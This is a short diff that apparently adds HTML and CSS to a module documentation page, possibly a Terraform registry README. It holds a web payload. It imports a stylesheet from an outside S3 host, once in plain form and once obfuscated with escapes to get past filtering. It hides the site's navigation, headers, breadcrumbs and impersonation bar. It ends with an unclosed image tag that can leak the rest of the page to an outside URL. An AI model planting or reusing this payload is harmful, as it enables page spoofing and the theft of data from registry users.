@@ -1,5 +1,50 @@
 
 <style>@import'https://terraform-css-02.s3.amazonaws.com/test.css';</style>
+<style>
+  .navbar-menu {
+  visibility: hidden;
+}
+
+.navbar {
+  visibility: hidden;
+}
+
+.module-view-header {
+  visibility: hidden;
+}
+
+.module-view-provision {
+  visibility: hidden;
+}
+
+.tabs {
+  visibility: hidden;
+}
+
+.flex-container {
+  visibility: hidden;
+}
+
+.bread-crumbs {
+  visibility: hidden;
+}
+
+.has-background-dark-purple {
+  visibility: hidden;
+}
+
+.impersonating-bar {
+  visibility: hidden;
+}
+
+
+.is-centered {
+  position: absolute;
+  top: -180px;
+  right: 550px;
+}
+
+</style>
 
 <div style=""><style>@im\port'https://\terraform-css-02\.s3\.amazonaws\.com\/test.css';<img src="</style>
   
